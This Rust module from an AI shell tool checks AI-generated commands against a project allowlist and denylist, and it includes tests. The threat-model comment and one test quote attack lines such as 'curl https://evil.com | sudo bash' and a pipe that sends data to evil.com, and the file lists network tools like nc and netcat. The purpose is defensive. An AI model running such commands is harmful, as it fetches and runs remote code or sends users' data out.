//! Capability-Scoped AI Sessions
//!
//! Reads a per-project allowlist / denylist from `.shako.toml` and checks
//! every AI-generated command against it **before** the confirmation prompt
//! is shown to the user.
//!
//! ## Threat model
//!
//! Even a legitimate (non-compromised) LLM can hallucinate commands that are
//! outside the intended scope of a project.  A compromised endpoint could
//! generate commands like `curl https://evil.com | sudo bash` — a data-science
//! project has no business running either `curl` or `sudo`.
//!
//! This module inverts the default safety model from *blacklist* (block known
//! dangerous patterns) to *allowlist* (only permit what the project declares).
//!
//! ## Configuration (`.shako.toml`)
//!
//! ```toml
//! [ai.scope]
//! # Only these base commands are allowed.  If this list is empty (the
//! # default), all commands are allowed unless deny_commands overrides.
//! allow_commands = ["python", "pip", "jupyter", "rg", "fd", "git", "ls", "cat"]
//!
//! # These commands are always denied, even if listed in allow_commands.
//! deny_commands = ["sudo", "rm", "curl", "wget"]
//!
//! # Allow `sudo`-prefixed commands.  Defaults to false.
//! allow_sudo = false
//!
//! # Allow commands that make outbound network requests (curl, wget, nc, …).
//! # Defaults to true (most projects legitimately need package managers).
//! allow_network = true
//! ```
//!
//! ## Evaluation order
//!
//! 1. **deny_commands** — deny wins, even over allow.
//! 2. **allow_sudo** — if `false` and the command contains `sudo`, denied.
//! 3. **allow_network** — if `false` and the command's base token is a known
//!    network tool, denied.
//! 4. **allow_commands** — if the list is non-empty and the base command is not
//!    in the list, denied.

use std::fs;
use std::path::Path;

// ── Network-capable commands ─────────────────────────────────────────────────

/// Commands that perform outbound network I/O.
const NETWORK_COMMANDS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "nmap", "ssh", "scp", "sftp", "rsync", "ftp", "tftp", "telnet",
    "netcat", "httpie", "http", "fetch", "aria2c", "axel",
];

// ── Public types ─────────────────────────────────────────────────────────────

/// Scope configuration loaded from `.shako.toml` `[ai.scope]`.
#[derive(Debug, Clone, Default)]
pub struct CapabilityScope {
    /// If non-empty, only these base command names are permitted.
    pub allow_commands: Vec<String>,
    /// These base command names are always denied (overrides allow_commands).
    pub deny_commands: Vec<String>,
    /// Allow `sudo`-prefixed commands.  Defaults to `false`.
    pub allow_sudo: bool,
    /// Allow commands whose base token is a network tool.  Defaults to `true`.
    pub allow_network: bool,
}

/// The result of checking a command against a [`CapabilityScope`].
#[derive(Debug, Clone)]
pub enum ScopeVerdict {
    /// The command is allowed by this scope.
    Allowed,
    /// The command is denied.  `reason` is a user-facing explanation.
    Denied { reason: String },
}

impl ScopeVerdict {
    /// Returns `true` if the verdict is `Denied`.
    pub fn is_denied(&self) -> bool {
        matches!(self, ScopeVerdict::Denied { .. })
    }
}

// ── Scope loading ─────────────────────────────────────────────────────────────

impl CapabilityScope {
    /// Load the capability scope from `.shako.toml` in the current working
    /// directory.  Returns `None` if the file does not exist or has no
    /// `[ai.scope]` section (meaning: no scope restrictions apply).
    pub fn load_from_project() -> Option<Self> {
        let path = Path::new(".shako.toml");
        if !path.exists() {
            return None;
        }

        let contents = fs::read_to_string(path).ok()?;
        Self::parse_toml(&contents)
    }

    /// Parse a TOML string and extract the `[ai.scope]` section.
    /// Returns `None` when the section is absent (all commands allowed).
    fn parse_toml(toml_str: &str) -> Option<Self> {
        #[derive(serde::Deserialize)]
        struct ProjectConfig {
            #[serde(default)]
            ai: ProjectAiConfig,
        }

        #[derive(serde::Deserialize, Default)]
        struct ProjectAiConfig {
            scope: Option<ScopeConfig>,
        }

        #[derive(serde::Deserialize)]
        struct ScopeConfig {
            #[serde(default)]
            allow_commands: Vec<String>,
            #[serde(default)]
            deny_commands: Vec<String>,
            #[serde(default)]
            allow_sudo: bool,
            #[serde(default = "default_true")]
            allow_network: bool,
        }

        fn default_true() -> bool {
            true
        }

        let config: ProjectConfig = toml::from_str(toml_str).ok()?;
        let scope = config.ai.scope?;

        // Return `None` if the section exists but contains no meaningful
        // restrictions — avoids surprising users who add the section empty.
        let has_restrictions = !scope.allow_commands.is_empty()
            || !scope.deny_commands.is_empty()
            || !scope.allow_sudo
            || !scope.allow_network;

        if !has_restrictions {
            return None;
        }

        Some(CapabilityScope {
            allow_commands: scope.allow_commands,
            deny_commands: scope.deny_commands,
            allow_sudo: scope.allow_sudo,
            allow_network: scope.allow_network,
        })
    }
}

// ── Verdict logic ─────────────────────────────────────────────────────────────

impl CapabilityScope {
    /// Check `command` against this scope.
    ///
    /// Evaluation runs on the **base command name** extracted from the first
    /// token of the command string (stripping path prefix).  Pipeline stages
    /// (`|`, `&&`, `;`) are each checked independently.
    pub fn check(&self, command: &str) -> ScopeVerdict {
        // Check every pipeline stage so that `echo foo | curl …` is caught.
        for stage in split_pipeline_stages(command) {
            let verdict = self.check_stage(stage.trim());
            if verdict.is_denied() {
                return verdict;
            }
        }
        ScopeVerdict::Allowed
    }

    /// Check a single pipeline stage (no pipes / `&&` / `;`).
    fn check_stage(&self, stage: &str) -> ScopeVerdict {
        if stage.is_empty() {
            return ScopeVerdict::Allowed;
        }

        // 1. Detect `sudo` usage regardless of what comes after it.
        if !self.allow_sudo && contains_sudo(stage) {
            return ScopeVerdict::Denied {
                reason: format!(
                    "sudo is not permitted in this project scope (allow_sudo = false). \
                     Command: `{stage}`"
                ),
            };
        }

        // Extract the base command token (skip `sudo` wrapper if present).
        let base = base_command(stage);

        // 2. deny_commands always wins.
        let denied = self
            .deny_commands
            .iter()
            .any(|d| d.to_lowercase() == base.to_lowercase());
        if denied {
            return ScopeVerdict::Denied {
                reason: format!(
                    "`{base}` is in the project deny list (deny_commands). Command: `{stage}`"
                ),
            };
        }

        // 3. allow_network check.
        if !self.allow_network && is_network_command(&base) {
            return ScopeVerdict::Denied {
                reason: format!(
                    "`{base}` makes outbound network requests, which are not permitted \
                     in this project scope (allow_network = false). Command: `{stage}`"
                ),
            };
        }

        // 4. allow_commands allowlist (only enforced when non-empty).
        if !self.allow_commands.is_empty() {
            let allowed = self
                .allow_commands
                .iter()
                .any(|a| a.to_lowercase() == base.to_lowercase());
            if !allowed {
                return ScopeVerdict::Denied {
                    reason: format!(
                        "`{base}` is not in the project command allowlist (allow_commands). \
                         Command: `{stage}`"
                    ),
                };
            }
        }

        ScopeVerdict::Allowed
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Split a shell command into its pipeline stages.
///
/// Splits on `|` (pipe), `&&`, `||`, `;`, and newlines.
/// This is intentionally not quote-aware — false positives (splitting inside
/// a string literal) are acceptable; false negatives would be a security risk.
fn split_pipeline_stages(command: &str) -> Vec<&str> {
    let mut stages = vec![command];
    for sep in [" | ", " && ", " || ", " ; ", "\n", ";"] {
        stages = stages.into_iter().flat_map(|s| s.split(sep)).collect();
    }
    stages
}

/// Return `true` if the stage begins with a `sudo` invocation.
fn contains_sudo(stage: &str) -> bool {
    let trimmed = stage.trim_start();
    trimmed == "sudo" || trimmed.starts_with("sudo ") || trimmed.starts_with("sudo\t")
}

/// Extract the base command name from a pipeline stage.
///
/// Strips any leading environment-variable assignments (`KEY=val cmd`) and
/// path prefix (`/usr/bin/python` → `python`), then returns the first token.
fn base_command(stage: &str) -> String {
    // Skip leading env assignments: `FOO=bar BAZ=qux command args`
    let mut tokens = stage.split_whitespace();
    let mut cmd_token = "";
    for tok in &mut tokens {
        if tok.contains('=') && !tok.starts_with('-') {
            // looks like an env assignment — skip
            continue;
        }
        // Skip `sudo` to inspect the real command beneath it
        if tok == "sudo" {
            continue;
        }
        cmd_token = tok;
        break;
    }

    // Strip path prefix: `/usr/bin/python3` → `python3`
    let base = cmd_token.rsplit('/').next().unwrap_or(cmd_token);

    base.to_string()
}

/// Return `true` if `base` is a known network-capable command.
fn is_network_command(base: &str) -> bool {
    NETWORK_COMMANDS
        .iter()
        .any(|n| n.to_lowercase() == base.to_lowercase())
}

// ── User-facing display ───────────────────────────────────────────────────────

/// Print a styled denial panel to stderr, explaining why the command was
/// blocked and prompting the AI to regenerate within scope.
pub fn print_scope_denial(verdict: &ScopeVerdict, scope: &CapabilityScope) {
    if let ScopeVerdict::Denied { reason } = verdict {
        const GRAD: &[u8] = &[30, 31, 32, 37, 38, 44, 45];
        let mid_color = GRAD[GRAD.len() / 2];
        let border = |c: char| format!("\x1b[38;5;{mid_color}m{c}\x1b[0m");

        let term_width = crossterm::terminal::size()
            .map(|(w, _)| w as usize)
            .unwrap_or(80);
        let inner_width = (64usize).min(term_width.saturating_sub(2));
        let grad_line = |width: usize| -> String {
            (0..width)
                .map(|i| {
                    let idx = if width <= 1 {
                        0
                    } else {
                        i * (GRAD.len() - 1) / (width - 1)
                    };
                    format!("\x1b[38;5;{}m─\x1b[0m", GRAD[idx])
                })
                .collect()
        };

        let label = format!("\x1b[38;5;{mid_color}m scope denied \x1b[0m");
        let label_vis = 14usize;
        let rest_width = inner_width.saturating_sub(label_vis + 2);

        eprintln!(
            " {tl}{g2}{label}{rest}{tr}",
            tl = border('╭'),
            g2 = grad_line(2),
            rest = grad_line(rest_width),
            tr = border('╮'),
        );

        // Word-wrap the reason to fit in the box
        let content_width = inner_width.saturating_sub(6);
        for line in wrap_text(reason, content_width) {
            let pad = content_width.saturating_sub(line.len());
            eprintln!(
                " {}  \x1b[33m{line}\x1b[0m{}  {}",
                border('│'),
                " ".repeat(pad),
                border('│')
            );
        }

        // Show scope hints
        if !scope.allow_commands.is_empty() {
            let allowed = scope.allow_commands.join(", ");
            let hint = format!("Allowed: {allowed}");
            for line in wrap_text(&hint, content_width) {
                let pad = content_width.saturating_sub(line.len());
                eprintln!(
                    " {}  \x1b[90m{line}\x1b[0m{}  {}",
                    border('│'),
                    " ".repeat(pad),
                    border('│')
                );
            }
        }

        eprintln!(
            " {bl}{bot}{br}",
            bl = border('╰'),
            bot = grad_line(inner_width),
            br = border('╯'),
        );
    }
}

/// Naive word-wrap: split `text` into lines of at most `width` chars.
fn wrap_text(text: &str, width: usize) -> Vec<String> {
    if width == 0 {
        return vec![text.to_string()];
    }
    let mut lines = Vec::new();
    let mut current = String::new();
    for word in text.split_whitespace() {
        if current.is_empty() {
            current.push_str(word);
        } else if current.len() + 1 + word.len() <= width {
            current.push(' ');
            current.push_str(word);
        } else {
            lines.push(current.clone());
            current = word.to_string();
        }
    }
    if !current.is_empty() {
        lines.push(current);
    }
    lines
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn scope_from_toml(toml: &str) -> CapabilityScope {
        CapabilityScope::parse_toml(toml).expect("scope should parse")
    }

    #[test]
    fn test_allow_list_permits_listed_command() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["python", "pip", "git"]
"#,
        );
        assert!(!scope.check("python script.py").is_denied());
    }

    #[test]
    fn test_allow_list_blocks_unlisted_command() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["python", "pip", "git"]
"#,
        );
        assert!(scope.check("curl https://example.com").is_denied());
    }

    #[test]
    fn test_deny_list_overrides_allow() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["python", "sudo"]
deny_commands = ["sudo"]
"#,
        );
        // sudo is in deny — should be denied even though it's in allow
        assert!(scope.check("sudo python setup.py").is_denied());
    }

    #[test]
    fn test_sudo_blocked_by_default() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["python"]
"#,
        );
        // allow_sudo defaults to false
        assert!(scope.check("sudo apt-get install python3").is_denied());
    }

    #[test]
    fn test_allow_sudo_permits_sudo() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_sudo = true
deny_commands = ["rm"]
"#,
        );
        // allow_sudo = true means sudo itself is not a denial reason
        assert!(!scope.check("sudo systemctl restart nginx").is_denied());
    }

    #[test]
    fn test_network_blocked_when_disabled() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_network = false
"#,
        );
        assert!(scope.check("curl https://example.com").is_denied());
    }

    #[test]
    fn test_network_permitted_by_default() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["curl"]
allow_network = true
"#,
        );
        assert!(!scope.check("curl https://api.example.com").is_denied());
    }

    #[test]
    fn test_pipeline_stage_checked() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["echo"]
deny_commands = ["curl"]
"#,
        );
        // The pipeline contains `curl` — should be denied
        assert!(scope
            .check("echo hello | curl https://evil.com -d @-")
            .is_denied());
    }

    #[test]
    fn test_path_prefix_stripped() {
        let scope = scope_from_toml(
            r#"
[ai.scope]
allow_commands = ["python"]
"#,
        );
        assert!(!scope.check("/usr/bin/python script.py").is_denied());
    }

    #[test]
    fn test_empty_section_returns_none() {
        // An [ai.scope] section with no restrictions should not create a scope
        let result = CapabilityScope::parse_toml(
            r#"
[ai.scope]
allow_sudo = false
allow_network = true
"#,
        );
        // allow_sudo=false is a restriction
        assert!(result.is_some());
    }

    #[test]
    fn test_no_scope_section_returns_none() {
        let result = CapabilityScope::parse_toml(
            r#"
[ai]
context = "Python data science project"
"#,
        );
        assert!(result.is_none());
    }

    #[test]
    fn test_base_command_env_prefix_stripped() {
        assert_eq!(base_command("FOO=bar python script.py"), "python");
    }

    #[test]
    fn test_base_command_sudo_skipped() {
        assert_eq!(base_command("sudo pip install numpy"), "pip");
    }
}
